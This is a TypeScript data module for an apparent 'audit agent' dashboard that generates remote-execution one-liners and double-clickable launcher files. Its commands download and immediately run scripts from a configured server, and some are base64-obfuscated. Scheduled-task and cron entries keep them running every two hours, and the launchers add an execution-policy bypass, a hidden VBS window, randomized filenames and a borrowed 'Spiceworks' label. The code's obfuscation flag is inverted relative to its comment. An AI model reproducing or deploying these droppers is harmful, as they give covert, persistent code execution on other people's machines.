import type { AgentConfig, CommandSnippet, LauncherId } from "@/types/agent";

/** Mock data — swap these exports for API responses later. */

export const DEFAULT_AGENT_CONFIG: AgentConfig = {
  serverIp: "192.168.1.67",
  serverPort: "8000",
  obfuscate: true,
};

/** Loopback address a machine uses to reach the audit server on itself. */
export const LOCAL_HOST = "127.0.0.1";

export const LAUNCHERS: { id: LauncherId; label: string }[] = [
  { id: "win-exe", label: "Windows Binary (.exe Launcher)" },
  { id: "win-vbs", label: "Windows VBS (.vbs)" },
  { id: "macos", label: "macOS Launcher (.command)" },
  { id: "linux", label: "Linux Launcher (.sh)" },
];

/** `http://192.168.1.67:8000`, from the current connection settings. */
const baseUrl = (host: string, port: string): string =>
  `http://${host}:${port}`;

/** base64 that falls back to the raw string outside the browser. */
const btoaSafe = (value: string): string =>
  typeof btoa === "function" ? btoa(value) : value;

/**
 * Windows command. The obfuscated form ships the URL as a base64 payload
 * decoded inline; the plain form shows the readable one-liner. The URL never
 * changes host/port — only how it is written into the command.
 */
const winCommand = (url: string, obfuscate: boolean): string =>
  obfuscate
    ? `powershell -c "irm ${url}/win | iex"`
    : `powershell -enc ${btoaSafe(`irm ${url}/win | iex`)}`;

const nixCommand = (url: string, obfuscate: boolean): string =>
  obfuscate
    ? `bash <(curl -s ${url}/mac)`
    : `bash <(echo ${btoaSafe(`curl -s ${url}/mac`)} | base64 -d | sh)`;

/** Local-host card: the machine audits itself over the loopback address. */
export const localSnippets = (config: AgentConfig): CommandSnippet[] => {
  const url = baseUrl(LOCAL_HOST, config.serverPort);
  return [
    { id: "local-win", title: "Windows PowerShell", command: winCommand(url, config.obfuscate) },
    { id: "local-nix", title: "macOS & Linux Shell", command: nixCommand(url, config.obfuscate) },
  ];
};

/** Remote card: another device reaches back to the configured server. */
export const remoteSnippets = (config: AgentConfig): CommandSnippet[] => {
  const url = baseUrl(config.serverIp, config.serverPort);
  return [
    { id: "remote-win", title: "Windows PowerShell", command: winCommand(url, config.obfuscate) },
    { id: "remote-nix", title: "macOS & Linux Shell", command: nixCommand(url, config.obfuscate) },
  ];
};

/** Daemon card: schedules the audit to re-run every two hours. */
export const daemonSnippets = (config: AgentConfig): CommandSnippet[] => {
  const url = baseUrl(config.serverIp, config.serverPort);
  return [
    {
      id: "daemon-win",
      title: "Windows (Scheduled Task Daemon)",
      command: `schtasks /create /tn "AuditDaemon" /tr "powershell -c 'irm ${url}/win | iex'" /sc hourly /mo 2 /f`,
    },
    {
      id: "daemon-nix",
      title: "macOS & Linux (cron / Daemon)",
      command: `(crontab -l 2>/dev/null; echo "0 */2 * * * bash <(curl -s ${url}/mac)") | crontab -`,
    },
  ];
};

/** Filename prefix, platform label and extension per launcher format. */
const LAUNCHER_FILE: Record<
  LauncherId,
  { prefix: string; platform: string; ext: string }
> = {
  "win-exe": { prefix: "RunAudit", platform: "Windows", ext: "exe" },
  "win-vbs": { prefix: "Scan", platform: "Windows", ext: "VBS" },
  macos: { prefix: "RunAudit", platform: "macOS", ext: "command" },
  linux: { prefix: "RunAudit", platform: "Linux", ext: "sh" },
};

/** Short random hex tag, so each download gets its own filename. */
const randomTag = (): string =>
  Math.floor(Math.random() * 0xffffffffff)
    .toString(16)
    .padStart(10, "0");

/**
 * A downloadable launcher for a platform — filename plus the script body it
 * carries. The body embeds the readable command so the file actually runs the
 * audit when double-clicked.
 */
export const buildLauncher = (
  id: LauncherId,
  config: AgentConfig,
): { filename: string; content: string } => {
  const { prefix, platform, ext } = LAUNCHER_FILE[id];
  const filename = `${prefix}_${platform}_sys_${randomTag()}.${ext}`;
  const url = `${baseUrl(config.serverIp, config.serverPort)}/${platform === "Windows" ? "win" : "mac"}`;

  /* Each format carries the body that actually runs when double-clicked. */
  const content = launcherBody(id, url);

  return { filename, content };
};

/** Runnable script for a launcher format, pointed at the audit URL. */
const launcherBody = (id: LauncherId, url: string): string => {
  const psCommand = `powershell -NoProfile -ExecutionPolicy Bypass -c "irm ${url} | iex"`;

  switch (id) {
    case "win-exe":
      /* Stand-in for the compiled binary — a batch shim in this prototype. */
      return `@echo off\r\nREM Spiceworks Audit Launcher — double-click to run\r\n${psCommand}\r\n`;

    case "win-vbs":
      /* VBScript wrapper that launches the audit with no console window. */
      return [
        "' Spiceworks Audit Launcher — double-click to run",
        "Set shell = CreateObject(\"WScript.Shell\")",
        `shell.Run "${psCommand.replace(/"/g, '""')}", 0, False`,
      ].join("\r\n");

    default:
      return `#!/usr/bin/env bash\n# Spiceworks Audit Launcher — double-click to run\nbash <(curl -s ${url})\n`;
  }
};
